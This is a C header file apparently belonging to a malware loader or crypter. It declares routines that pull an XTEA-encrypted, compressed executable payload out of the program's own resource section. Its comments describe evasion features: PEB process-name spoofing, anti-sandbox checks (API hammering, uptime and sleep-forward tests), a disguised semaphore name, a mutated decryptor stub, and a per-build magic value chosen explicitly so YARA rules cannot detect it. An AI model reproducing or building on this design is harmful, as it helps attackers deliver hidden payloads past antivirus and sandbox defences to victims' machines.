#pragma once

#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* =========================================================================
 *  Payload.h - Module isolating payload reading from its own .exe file
 *
 *  .rsrc metadata block layout (last 280 bytes of the resource):
 *
 *  Offsets from magic position p (p points at first byte of magic DWORD):
 *    p[  0..  3]  magic          — key_salt[0]^key_salt[1]^key_salt[2]^key_salt[3]
 *    p[  -4.. -1] flags          — OPSEC_FLAG_* bitmask (DWORD)
 *    p[  -8.. -5] hammer_ms      — API-hammer duration in ms; 0 = default 3000 (DWORD)
 *    p[ -12.. -9] uptime_min     — uptime threshold in minutes; 0 = default 2 (DWORD)
 *    p[ -16..-13] sleep_fwd_ms   — sleep-fwd sleep duration in ms; 0 = default 500 (DWORD)
 *    p[ -48..-17] semaphore_name — exec-ctrl semaphore name (32 bytes, zero-padded)
 *    p[-112..-49] spoof_exe      — ASCII filename for PEB spoof (64 bytes, zero-padded)
 *    p[-240..-113] exportArg     — null-terminated export argument string (128 bytes, zero-padded)
 *    p[-244..-241] exportHash    — fixed-seed Djb2 hash of DLL export to invoke (DWORD; 0 = none)
 *    p[-248..-245] blobSize      — XTEA blob size (DWORD)
 *    p[-252..-249] stubSize      — mutated ASM decryptor size (DWORD)
 *    p[-256..-253] origSize      — original decompressed PE size (ULONG)
 *    p[-260..-257] dll+pad       — [dll_idx0, dll_idx1, dll_idx2, 0x00]
 *    p[-276..-261] key_salt      — per-build XTEA key salt (16 bytes / 4 DWORDs)
 *
 *  Actual layout appended after the XTEA blob:
 *    key_salt(16) + [dll0,dll1,dll2,pad](4) + origSize(4) + stubSize(4) + blobSize(4)
 *    + exportHash(4) + exportArg(128) + spoof_exe(64) + semaphore_name(32)
 *    + sleep_fwd_ms(4) + uptime_min(4) + hammer_ms(4) + flags(4) + magic(4) = 280 bytes total
 *
 *  kMagicOffset = sizeof(PAYLOAD_METADATA) - sizeof(DWORD) = 276
 *  magic = key_salt[0]^key_salt[1]^key_salt[2]^key_salt[3]
 *  Stub verifies by re-computing magic from the key_salt it reads.
 *  No fixed value → YARA cannot anchor on a static magic constant.
 * ========================================================================= */

/* Retrieves the XTEA-encrypted blob and all metadata from .rsrc.
 *
 *  ppRawPayload                [out] — VirtualAlloc'd copy of the XTEA-encrypted blob
 *  pdwPayloadSize              [out] — size of that blob in bytes
 *  pdwMutatedStubSize          [out] — size of the mutated ASM decryptor at blob[0]
 *  pdwOriginalDecompressedSize [out] — uncompressed PE size for RtlDecompressBuffer
 *  key_salt                    [out] — 4-DWORD per-build salt; pass to Xtea_DeriveKey()
 *  dll_indices                 [out] — 3-byte array of indices into g_DllPool
 *  pdwExportHash               [out] — fixed-seed Djb2 hash of DLL export to invoke (0 = none)
 *  ppExportArg                 [out] — pointer into the locked resource view for the arg string
 *  ppSpoofExe                  [out] — pointer into the locked resource view for the spoof filename
 *  ppSemaphoreName             [out] — pointer into locked resource view for semaphore name
 *                                      (NULL if field is empty — caller should use default "wuauctl")
 *  pdwSleepFwdMs               [out] — sleep duration for sleep-fwd check (ms); 0 = use default
 *  pdwUptimeMin                [out] — uptime threshold (minutes); 0 = use default
 *  pdwHammerMs                 [out] — API-hammer duration (ms); 0 = use default 3000 ms
 *  pdwOpsecFlags               [out] — OPSEC_FLAG_* bitmask read from metadata
 *  pdwError                    [out] — numeric error code on failure
 */
BOOL GetPayloadFromResource(PBYTE*  ppRawPayload,
                             PDWORD  pdwPayloadSize,
                             PDWORD  pdwMutatedStubSize,
                             PDWORD  pdwOriginalDecompressedSize,
                             DWORD   key_salt[4],
                             BYTE    dll_indices[3],
                             DWORD*  pdwExportHash,
                             LPCSTR* ppExportArg,
                             LPCSTR* ppSpoofExe,
                             LPCSTR* ppSemaphoreName,
                             DWORD*  pdwSleepFwdMs,
                             DWORD*  pdwUptimeMin,
                             DWORD*  pdwHammerMs,
                             DWORD*  pdwOpsecFlags,
                             PDWORD  pdwError);

BOOL DecompressPayload(const BYTE* inBuffer, ULONG inSize, BYTE** outBuffer, ULONG outExpectedSize);

#ifdef __cplusplus
}
#endif
